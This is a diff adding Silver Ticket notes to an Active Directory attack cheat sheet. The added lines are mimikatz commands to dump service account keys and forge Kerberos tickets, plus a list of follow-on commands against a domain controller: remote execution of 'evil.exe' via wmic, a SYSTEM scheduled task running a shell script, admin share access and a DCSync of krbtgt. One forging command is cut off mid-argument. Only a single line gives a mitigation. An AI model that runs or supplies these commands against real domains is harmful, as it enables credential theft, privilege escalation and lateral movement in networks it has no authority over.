@@ -48,12 +48,21 @@
 
 # SILVER TICKET
 
+### Forging a Service Ticket (ST) require machine account password (key) or NT hash of the service account.
+
 #### 1) mimikatz.exe
 
 #### 2) privilege::debug
 
 #### 3) lsadump::lsa /inject /name:SERVICE/DOMAIN ADMIN
 
+### 1) Create a ticket for the service
+
+ - mimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:
+
+ - mimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-134912914
+
+### 2) Use same steps as a golden ticket
 
 # Golden Ticket
 
@@ -84,3 +93,26 @@
 ### 1) Hard to detect because they are legit TGT tickets
 
 ### 2) Mimikatz generates a golden ticket with a life-span of 10 years
+
+## Services to target with a Silver Ticket
+
+### Service Type --> Service Silver Tickets --> Attack
+
+#### 1) WMI --> HOST + RPCSS --> wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"
+
+#### 2) Powershell Remoting --> CIFS + HTTP + (wsman?) --> New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC
+
+#### 3) WinRM --> HTTP+ wsman --> New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC
+
+#### 4) Scheduled Tasks --> HOST --> schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"
+
+#### 5) Windows File Share (CIFS) --> CIFS --> dir \\dc01\c$
+
+#### 6) LDAP operations including Mimikatz DCSync --> LDAP --> lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt
+
+#### 7) Windows Remote Server Administration Tools (RSAT) --> RPCSS + LDAP + CIFS --> /
+
+## MITIGATIONS
+
+### Set the attribute "Account is Sensitive and Cannot be Delegated" to prevent lateral movement with the generated ticket.
+
